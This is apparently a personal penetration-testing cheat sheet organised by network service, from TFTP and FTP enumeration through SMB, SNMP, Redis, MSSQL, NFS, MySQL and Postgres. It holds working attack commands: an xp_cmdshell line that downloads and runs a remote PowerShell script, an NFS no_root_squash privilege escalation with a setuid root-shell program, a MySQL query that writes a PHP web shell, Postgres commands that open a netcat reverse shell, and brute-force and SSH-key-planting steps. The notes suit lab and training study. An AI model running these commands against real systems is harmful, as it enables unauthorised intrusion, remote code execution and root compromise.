# udp/69 tftp
https://book.hacktricks.xyz/pentesting/69-udp-tftp
* linux command
    > tftp
    > connect ip_addr
    > ?
* nmap scan
    > nmap -n -Pn -sU -p69 -sV --script tftp-enum ip_addr
* Refer to other installations to find out the folder setup of the target
* `dir /x` shows the directory in old notation
* get the file using the following
> get filename


# 21/tcp ftp
* https://book.hacktricks.xyz/pentesting/pentesting-ftp
* ftp brute force
    > nmap --script ftp-brute -p 21 <host>
* sometimes this port is not shown in the scan
* if cannot list directory, try `passive` mode
* sometimes there are hidden files, so search with `ls -la`
* ftp `bounce` scan
    > nmap -PO -b username:password@ftpserver.tld:21 -vvv -oN scan_internal.nmap 127.0.0.1 --script="default,vuln"
* recursive download
    > wget -r ftp://anonymous:anonymous@<ip>:<port>/
* lftp
```
└─$ lftp
lftp :~> set ftp:ssl-force false
lftp :~> set ssl:verify-certificate no
lftp :~> connect <ip>
lftp <ip>:~> login anonymous anonymous
lftp anonymous@<ip>:~> ls
```

# 22/tcp ssh
* having authorized_keys
    * https://blog.g0tmi1k.com/2010/04/pwnos/
    * https://gitbook.brainyou.stream/basic-linux/ssh-key-predictable-prng-authorized_keys-process


# 23/tcp telnet
* can login using telnet, but the password prompt may be `slow`
    > telnet -l <username> <ip>

# tcp/25 smtp
> smtp-user-enum -U /usr/share/wordlists/dirb/others/names.txt -M RCPT -t <ip>
    > perl smtp-user-enum.pl -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <ip>
> nmap --script smtp-enum-users <ip> -Pn

# tcp/110 pop3
* receive emails
    > telnet <ip> 110
    > user <user>
    > pass <pass>
    > list
    > retr <num>, retr 1

# tcp/139 smb
* grep the smb version
    > sudo ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]'
    > smbclient -L \\\\ip -N
    * also can use https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh
* new smbclient doesn't support old protocols, to enable
    * edit /etc/samba/smb.conf under `global`
    ```
    client min protocol = LANMAN1
    ```
    > service smbd restart
* smb 3.4.5 symlink directory traversal
    * https://github.com/roughiz/Symlink-Directory-Traversal-smb-manually


# tcp/873 rsync
https://book.hacktricks.xyz/pentesting/873-pentesting-rsync
> nmap -sV --script "rsync-list-modules" -p873 <ip>
* list files
    > rsync -av --list-only rsync://<ip>
* transfer files
    > rsync -av rsync://<ip>/dir ./dir 
* upload files
    > rsync -av .ssh/ rsync://<ip>/dir/.ssh


# udp/161 snmp
* https://github.com/dheiland-r7/snmp
    > perl snmpbw.pl <ip> public 2 1
* 161 uses UDP, hence need the `nmap -sU` flag to scan
* community string enum: 
> onesixtyone <ip> -c snmp_community_strings_wordlist_onesixtyone.txt
* community string wordlist
https://raw.githubusercontent.com/thedarksource/Security/master/Network/SNMP/snmp_community_strings_wordlist_onesixtyone.txt
/usr/share/wordlists/SecLists/Discovery/SNMP/
* snmp-check
> snmp-check <ip>
* snmpwalk
    * setup with extended walk: https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce#getting-the-shell-from-net-snmp-extend
> snmpwalk -v 2c -c public <ip> NET-SNMP-EXTEND-MIB::nsExtendObjects
> snmpwalk -v 2c -c public <ip> NET-SNMP-EXTEND-MIB::nsExtendOutputFull


# tcp/6379 redis
* 5.0.9, https://github.com/vulhub/redis-rogue-getshell
* https://book.hacktricks.xyz/pentesting/6379-pentesting-redis

# tcp/194 6660-7000 irc
> nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 <ip>
> hexchat


# tcp/1433 mssql
* `cracking mdf` files
    * https://github.com/improvedk/OrcaMDF
    * https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes
* `command execution`
    * https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server#execute-commands
    > impacket-mssqlclient user:pass@<ip>
    > enable_xp_cmdshell
    > xp_cmdshell powershell.exe IEX (New-Object Net.WebClient).DownloadString(\"http://<ip>/shell.ps1\");
* `error-based` injeciton
    * https://www.exploit-db.com/papers/12975
    * https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/


# tcp/1978 RemoteMouse
* https://www.exploit-db.com/exploits/46697


# tcp/2049 NFS no_root_squash/no_all_squash misconfiguration PE
* Check vulnerability
    > showmount -e 127.0.0.1
        Export list for 127.0.0.1:
        /srv/Share 127.0.0.1/32,<ip>/24
    > cat /etc/exports
        /srv/Share <ip>/24(insecure,rw)
        /srv/Share 127.0.0.1/32(`no_root_squash`,`insecure`,rw)
* Download exploit
    > git clone https://github.com/sahlberg/libnfs.git
* Compile the code
    > ./bootstrap
    > ./configure
    > make
    > gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
* create a simple exploit `pwn.c` and compile, `gcc pwn.c -o pwn`
```c
int main(void){setreuid(0,0); sys tem("/bin/bash"); return 0;}
```
* Transfer the compiled example (i.e `ld_nfs.so`), exploit (i.e `pwn`) and another two libraries (i.e `libnfs.so`, `libnfs.so.13`) in the `lib/.lib` folder to the target
    > curl http://<ip>/pwn --output pwn
    > curl http://<ip>/ld_nfs.so --output ld_nfs.so
    > curl http://<ip>/libnfs.so --output libnfs.so
    > curl http://<ip>/libnfs.so.13 --output libnfs.so.13
* prepare the exploit
    > LD_NFS_UID=0 LD_LIBRARY_PATH=/home/megan/ LD_PRELOAD=./ld_nfs.so cp pwn nfs://127.0.0.1/srv/Share/pwn
    > LD_NFS_UID=0 LD_LIBRARY_PATH=/home/megan/ LD_PRELOAD=./ld_nfs.so chown root: nfs://127.0.0.1/srv/Share/pwn
    > LD_NFS_UID=0 LD_LIBRARY_PATH=/home/megan/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://127.0.0.1/srv/Share/pwn
    > LD_NFS_UID=0 LD_LIBRARY_PATH=/home/megan/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://127.0.0.1/srv/Share/pwn
* run it
    > /srv/Share/pwn


# tcp/3306 mysql
* write to filesystem
> SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE "/var/www/https/blogblog/wp-content/uploads/shell.php";


# tcp/5432 postgres
> create table logs (value text);
> delete from logs; copy logs (value) from program 'whoami'; select * from logs;
> delete from logs; copy logs (value) from program 'nc -v <ip> <port> -e /bin/bash'; select * from logs;

* For very restricted hosts
> base64 -w 0 < /usr/bin/nc > nc.txt
> delete from logs; copy logs (value) from program 'echo [base64_content] > /tmp/nc.txt'; select * from logs;
> delete from logs; copy logs (value) from program 'base64 -d /tmp/nc.txt > /tmp/nc'; select * from logs;
> delete from logs; copy logs (value) from program 'chmod u+x /tmp/nc'; select * from logs;

* Reverse shell
> delete from logs; copy logs (value) from program 'nc -vn [ip] [port] -e /bin/bash'; select * from logs;
> ngrok tcp 4444
> nc -vnlp 4444